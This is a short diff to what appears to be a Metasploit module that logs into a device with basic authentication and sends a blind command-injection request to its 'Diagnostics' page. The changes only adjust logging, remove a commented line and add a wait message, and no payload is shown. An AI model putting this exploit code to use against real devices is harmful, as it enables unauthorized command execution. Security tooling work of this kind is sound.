@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 			if [200, 301, 302].include?(res.code)
 				print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
 			else
-				vprint_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
+				print_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
 				return
 			end
 
@@ -90,7 +90,6 @@ class Metasploit3 < Msf::Auxiliary
 					'uri'    => uri,
 					'method' => 'POST',
 					'authorization' => basic_auth(user,pass),
-					#'data'  => data_cmd
 					'encode_params' => false,
 					'vars_post' => {
 						"submit_button" => "Diagnostics",
@@ -109,5 +108,6 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
+		print_status("#{rhost}:#{rport} - Blind Exploitation - wait around 10 seconds till the command gets executed")
 	end
 end
